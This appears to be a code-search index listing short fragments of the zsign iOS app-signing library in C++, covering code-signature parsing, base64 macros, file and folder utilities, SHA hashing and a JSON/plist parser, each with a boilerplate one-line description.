476,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp","Function LE - implements le functionality","return LE(psb->length);"
477,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp","Function ParseCodeSignature - implements parsecodesignature functionality","bool ParseCodeSignature(uint8_t *pCSBase)
{"
478,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp","Function SlotGetCodeSlotsData - implements slotgetcodeslotsdata functionality","bool SlotGetCodeSlotsData(uint8_t *pSlotBase, uint8_t *&pCodeSlots, uint32_t &uCodeSlotsLength)
{"
479,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp","Function GetCodeSignatureExistsCodeSlotsData - implements getcodesignatureexistscodeslotsdata functionality","bool GetCodeSignatureExistsCodeSlotsData(uint8_t *pCSBase, uint8_t *&pCodeSlots1Data, uint32_t &uCodeSlots1DataLength,
uint8_t *&pCodeSlots256Data, uint32_t &uCodeSlots256DataLength)
{"
480,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/base64.cpp","Function B0 - implements b0 functionality","#define B0(a) (a & 0xFF)
#define B1(a) (a >> 8 & 0xFF)
#define B2(a) (a >> 16 & 0xFF)
#define B3(a) (a >> 24 & 0xFF)

ZBase64::ZBase64(void) {}"
481,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/base64.cpp","Function B1 - implements b1 functionality","#define B1(a) (a >> 8 & 0xFF)
#define B2(a) (a >> 16 & 0xFF)
#define B3(a) (a >> 24 & 0xFF)

ZBase64::ZBase64(void) {}"
482,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/base64.cpp","Function B2 - implements b2 functionality","#define B2(a) (a >> 16 & 0xFF)
#define B3(a) (a >> 24 & 0xFF)

ZBase64::ZBase64(void) {}"
483,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/base64.cpp","Function B3 - implements b3 functionality","#define B3(a) (a >> 24 & 0xFF)

ZBase64::ZBase64(void) {}"
484,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/base64.cpp","Function Encode - implements encode functionality","char *ZBase64::Encode(const string &strData) { return Encode(strData.c_str(), (int)strData.size()); }"
485,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/base64.cpp","Function Decode - implements decode functionality","return Decode(strData.c_str(), (int)strData.size(), pOutDataLen);"
486,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function PARSEVALIST - implements parsevalist functionality","#define PARSEVALIST(szFormatArgs, szArgs)                                                                              \
ZBuffer buffer;                                                                                                    \"
487,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function IsRegularFile - implements isregularfile functionality","bool IsRegularFile(const char *file)
{"
488,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","struct stat - implements stat functionality","struct stat info;
stat(file, &info);
return S_ISREG(info.st_mode);
}

void *MapFile(const char *path, size_t offset, size_t size, size_t *psize, bool ro)
{"
489,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function S_ISREG - implements s isreg functionality","return S_ISREG(info.st_mode);"
490,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","struct stat - implements stat functionality","struct stat stat;
fstat(fd, &stat);
size = stat.st_size;
}

if (NULL != psize)
{"
491,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function WriteFile - implements writefile functionality","bool WriteFile(const char *szFile, const char *szData, size_t sLen)
{"
492,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function WriteFile - implements writefile functionality","bool WriteFile(const char *szFile, const string &strData) { return WriteFile(szFile, strData.data(), strData.size()); }"
493,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function WriteFile - implements writefile functionality","bool WriteFile(string &strData, const char *szFormatPath, ...)
{"
494,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function WriteFile - implements writefile functionality","return WriteFile(szPath, strData);"
495,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function WriteFile - implements writefile functionality","bool WriteFile(const char *szData, size_t sLen, const char *szFormatPath, ...)
{"
496,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function WriteFile - implements writefile functionality","return WriteFile(szPath, szData, sLen);"
497,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function ReadFile - implements readfile functionality","bool ReadFile(const char *szFile, string &strData)
{"
498,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function ReadFile - implements readfile functionality","bool ReadFile(string &strData, const char *szFormatPath, ...)
{"
499,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function ReadFile - implements readfile functionality","return ReadFile(szPath, strData);"
500,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function AppendFile - implements appendfile functionality","bool AppendFile(const char *szFile, const char *szData, size_t sLen)
{"
501,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function AppendFile - implements appendfile functionality","bool AppendFile(const char *szFile, const string &strData)
{"
502,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function AppendFile - implements appendfile functionality","return AppendFile(szFile, strData.data(), strData.size());"
503,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function IsFolder - implements isfolder functionality","bool IsFolder(const char *szFolder)
{"
504,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","struct stat - implements stat functionality","struct stat st;
stat(szFolder, &st);
return S_ISDIR(st.st_mode);
}

bool IsFolderV(const char *szFormatPath, ...)
{"
505,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function S_ISDIR - implements s isdir functionality","return S_ISDIR(st.st_mode);"
506,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function IsFolderV - implements isfolderv functionality","bool IsFolderV(const char *szFormatPath, ...)
{"
507,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function IsFolder - implements isfolder functionality","return IsFolder(szFolder);"
508,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function CreateFolder - implements createfolder functionality","bool CreateFolder(const char *szFolder)
{"
509,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function CreateFolderV - implements createfolderv functionality","bool CreateFolderV(const char *szFormatPath, ...)
{"
510,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function CreateFolder - implements createfolder functionality","return CreateFolder(szFolder);"
511,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","struct stat - implements stat functionality","int RemoveFolderCallBack(const char *fpath, const struct stat *sb, int typeflag, struct FTW *ftwbuf)
{"
512,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function RemoveFolder - implements removefolder functionality","bool RemoveFolder(const char *szFolder)
{"
513,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function nftw - implements nftw functionality","return nftw(szFolder, RemoveFolderCallBack, 64, FTW_DEPTH | FTW_PHYS);"
514,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function RemoveFolderV - implements removefolderv functionality","bool RemoveFolderV(const char *szFormatPath, ...)
{"
515,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function RemoveFolder - implements removefolder functionality","return RemoveFolder(szFolder);"
516,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function RemoveFile - implements removefile functionality","bool RemoveFile(const char *szFile) { return (0 == remove(szFile)); }"
517,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function RemoveFileV - implements removefilev functionality","bool RemoveFileV(const char *szFormatPath, ...)
{"
518,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function RemoveFile - implements removefile functionality","return RemoveFile(szFile);"
519,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function IsFileExists - implements isfileexists functionality","bool IsFileExists(const char *szFile)
{"
520,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function IsFileExistsV - implements isfileexistsv functionality","bool IsFileExistsV(const char *szFormatPath, ...)
{"
521,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function IsFileExists - implements isfileexists functionality","return IsFileExists(szFile);"
522,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function IsZipFile - implements iszipfile functionality","bool IsZipFile(const char *szFile)
{"
523,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function GetCanonicalizePath - implements getcanonicalizepath functionality","string GetCanonicalizePath(const char *szPath)
{"
524,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function GetFileSize - implements getfilesize functionality","int64_t GetFileSize(int fd)
{"
525,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","struct stat - implements stat functionality","struct stat stbuf;
if (0 == fstat(fd, &stbuf))
{"
526,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function GetFileSize - implements getfilesize functionality","int64_t GetFileSize(const char *szFile)
{"
527,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function GetFileSizeV - implements getfilesizev functionality","int64_t GetFileSizeV(const char *szFormatPath, ...)
{"
528,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function GetFileSize - implements getfilesize functionality","return GetFileSize(szFile);"
529,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function GetFileSizeString - implements getfilesizestring functionality","string GetFileSizeString(const char *szFile) { return FormatSize(GetFileSize(szFile), 1024); }"
530,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function FormatSize - implements formatsize functionality","string FormatSize(int64_t size, int64_t base)
{"
531,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function IsPathSuffix - implements ispathsuffix functionality","bool IsPathSuffix(const string &strPath, const char *suffix)
{"
532,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function GetUnixStamp - implements getunixstamp functionality","time_t GetUnixStamp()
{"
533,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function GetMicroSecond - implements getmicrosecond functionality","uint64_t GetMicroSecond()
{"
534,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","struct timeval - implements timeval functionality","struct timeval tv = {0};
gettimeofday(&tv, NULL);
return tv.tv_sec * 1000000 + tv.tv_usec;
}

bool SystemExec(const char *szFormatCmd, ...)
{"
535,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function SystemExec - implements systemexec functionality","bool SystemExec(const char *szFormatCmd, ...)
{"
536,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function _Swap - implements  swap functionality","uint16_t _Swap(uint16_t value) { return ((value >> 8) & 0x00ff) | ((value << 8) & 0xff00); }"
537,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function _Swap - implements  swap functionality","uint32_t _Swap(uint32_t value)
{"
538,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function _Swap - implements  swap functionality","uint64_t _Swap(uint64_t value)
{"
539,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function ByteAlign - implements bytealign functionality","uint32_t ByteAlign(uint32_t uValue, uint32_t uAlign) { return (uValue + (uAlign - uValue % uAlign)); }"
540,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function StringSplit - implements stringsplit functionality","void StringSplit(const string &src, const string &split, vector<string> &dest)
{"
541,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function SHA1Text - implements sha1text functionality","bool SHA1Text(const string &strData, string &strOutput)
{"
542,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function PrintSHASum - implements printshasum functionality","void PrintSHASum(const char *prefix, const uint8_t *hash, uint32_t size, const char *suffix)
{"
543,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function PrintSHASum - implements printshasum functionality","void PrintSHASum(const char *prefix, const string &strSHASum, const char *suffix)
{"
544,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function PrintDataSHASum - implements printdatashasum functionality","void PrintDataSHASum(const char *prefix, int nSumType, const string &strData, const char *suffix)
{"
545,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function PrintDataSHASum - implements printdatashasum functionality","void PrintDataSHASum(const char *prefix, int nSumType, uint8_t *data, size_t size, const char *suffix)
{"
546,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function SHASum - implements shasum functionality","bool SHASum(int nSumType, uint8_t *data, size_t size, string &strOutput)
{"
547,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function SHASum - implements shasum functionality","bool SHASum(int nSumType, const string &strData, string &strOutput)
{"
548,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function SHASum - implements shasum functionality","return SHASum(nSumType, (uint8_t *)strData.data(), strData.size(), strOutput);"
549,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function SHASum - implements shasum functionality","bool SHASum(const string &strData, string &strSHA1, string &strSHA256)
{"
550,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function SHASumFile - implements shasumfile functionality","bool SHASumFile(const char *szFile, string &strSHA1, string &strSHA256)
{"
551,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function SHASumBase64 - implements shasumbase64 functionality","bool SHASumBase64(const string &strData, string &strSHA1Base64, string &strSHA256Base64)
{"
552,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function SHASumBase64File - implements shasumbase64file functionality","bool SHASumBase64File(const char *szFile, string &strSHA1Base64, string &strSHA256Base64)
{"
553,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function Reset - implements reset functionality","return Reset();"
554,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function Reset - implements reset functionality","return Reset();"
555,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp","Function logFile - implements logfile functionality","std::ofstream logFile(logFilePath, std::ios_base::app);"
556,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function _atoi64 - implements  atoi64 functionality","#define _atoi64(val) strtoll(val, NULL, 10)
#endif

const JValue JValue::null;"
557,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function string - implements string functionality","m_Value.vData = new string();"
558,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function asCString - implements ascstring functionality","JValue::operator const char *() const { return asCString(); }"
559,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function int - implements int functionality","JValue::operator int() const { return asInt(); }"
560,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function int64_t - implements int64 t functionality","JValue::operator int64_t() const { return asInt64(); }"
561,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function double - implements double functionality","JValue::operator double() const { return asFloat(); }"
562,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function string - implements string functionality","JValue::operator string() const { return asCString(); }"
563,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function bool - implements bool functionality","JValue::operator bool() const { return asBool(); }"
564,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function string - implements string functionality","m_Value.vData = new string();"
565,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function int - implements int functionality","return int(m_Value.vFloat);"
566,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function _atoi64 - implements  atoi64 functionality","return _atoi64(asCString());"
567,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function double - implements double functionality","return double(m_Value.vInt64);"
568,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function atof - implements atof functionality","return atof(asCString());"
569,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function remove - implements remove functionality","return remove((size_t)index);"
570,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function write - implements write functionality","return write(strDoc);"
571,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function read - implements read functionality","bool JValue::read(const string &strdoc, string *pstrerr) { return read(strdoc.c_str(), pstrerr); }"
572,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function push_back - implements push back functionality","bool JValue::push_back(int val) { return push_back(JValue(val)); }"
573,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function push_back - implements push back functionality","bool JValue::push_back(bool val) { return push_back(JValue(val)); }"
574,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function push_back - implements push back functionality","bool JValue::push_back(double val) { return push_back(JValue(val)); }"
575,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function push_back - implements push back functionality","bool JValue::push_back(int64_t val) { return push_back(JValue(val)); }"
576,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function push_back - implements push back functionality","bool JValue::push_back(const char *val) { return push_back(JValue(val)); }"
577,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function push_back - implements push back functionality","bool JValue::push_back(const string &val) { return push_back(JValue(val)); }"
578,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function push_back - implements push back functionality","bool JValue::push_back(const char *val, size_t len) { return push_back(JValue(val, len)); }"
579,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function styleWrite - implements stylewrite functionality","return styleWrite(strDoc);"
580,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function string - implements string functionality","m_Value.vData = new string();"
581,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function mktime - implements mktime functionality","return mktime(&ft);"
582,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function readPList - implements readplist functionality","return readPList(strdoc.data(), strdoc.size(), pstrerr);"
583,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","struct stat - implements stat functionality","struct stat stbuf;
if (0 == fstat(fileno(fp), &stbuf))
{"
584,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function read - implements read functionality","return read(strdata, pstrerr);"
585,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","struct stat - implements stat functionality","struct stat stbuf;
if (0 == fstat(fileno(fp), &stbuf))
{"
586,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function readPList - implements readplist functionality","return readPList(strdata, pstrerr);"
587,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function WriteDataToFile - implements writedatatofile functionality","return WriteDataToFile(file, strdata.data(), strdata.size());"
588,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function WriteDataToFile - implements writedatatofile functionality","return WriteDataToFile(file, strdata.data(), strdata.size());"
589,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function WriteDataToFile - implements writedatatofile functionality","return WriteDataToFile(file, strdata.data(), strdata.size());"
590,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function readFile - implements readfile functionality","return readFile(file);"
591,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function readPListFile - implements readplistfile functionality","return readPListFile(file);"
592,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function writeFile - implements writefile functionality","return writeFile(file);"
593,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function writePListFile - implements writeplistfile functionality","return writePListFile(file);"
594,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function styleWriteFile - implements stylewritefile functionality","return styleWriteFile(file);"
595,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function writePList - implements writeplist functionality","return writePList(strDoc);"
596,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function readValue - implements readvalue functionality","return readValue(root);"
597,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function decodeNumber - implements decodenumber functionality","return decodeNumber(token, jval);"
598,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function readArray - implements readarray functionality","return readArray(jval);"
599,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function readObject - implements readobject functionality","return readObject(jval);"
600,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function addError - implements adderror functionality","return addError(""Syntax error: value, object or array expected."", token.pbeg);"
601,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function readToken - implements readtoken functionality","return readToken(token);"
602,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function addError - implements adderror functionality","return addError(""Missing ':' after object member name"", colon.pbeg);"
603,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function addError - implements adderror functionality","return addError(""Missing ',' or '}' in object declaration"", comma.pbeg);"
604,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function addError - implements adderror functionality","return addError(""Missing '}' or object member name"", tokenName.pbeg);"
605,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function addError - implements adderror functionality","return addError(""Missing ',' or ']' in array declaration"", token.pbeg);"
606,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function decodeDouble - implements decodedouble functionality","return decodeDouble(token, jval);"
607,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function addError - implements adderror functionality","return addError(""'"" + string(token.pbeg, token.pend) + ""' is not a number."", token.pbeg);"
608,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function addError - implements adderror functionality","return addError(""'"" + string(token.pbeg, token.pend) + ""' is too large or not a number."", token.pbeg);"
609,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function addError - implements adderror functionality","return addError(""Bad escape sequence in string"", pcur);"
610,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function addError - implements adderror functionality","return addError(""Bad escape sequence in string"", pcur);"
611,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function addError - implements adderror functionality","return addError(""Empty escape sequence in string"", pcur);"
612,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function string - implements string functionality","return string(""\"""") + pstr + ""\"""";"
613,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","Function string - implements string functionality","std::string JWriter::vstring2s(const char *pstr) { return string(""\\\"""") + pstr + ""\\\""""; }"
614,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp","//////////////////////////////////////////////////////////////////////// //////////////////////////////////////////////////////////////////////// ////////////////////////////////////////////////////////////////////////","#define BE16TOH(x) ((((x) & 0xFF00) >> 8) | (((x) & 0x00FF) << 8))

#define BE32TOH(x)                                                                                                     \
((((x) & 0xFF000000) >> 24) | (((x) & 0x00FF0000) >> 8) | (((x) & 0x0000FF00) << 8) | (((x) & 0x000000FF) << 24))

#define BE64TOH(x)                                                                                                     \
((((x) & 0xFF00000000000000ull) >> 56) | (((x) & 0x00FF000000000000ull) >> 40) |                                   \
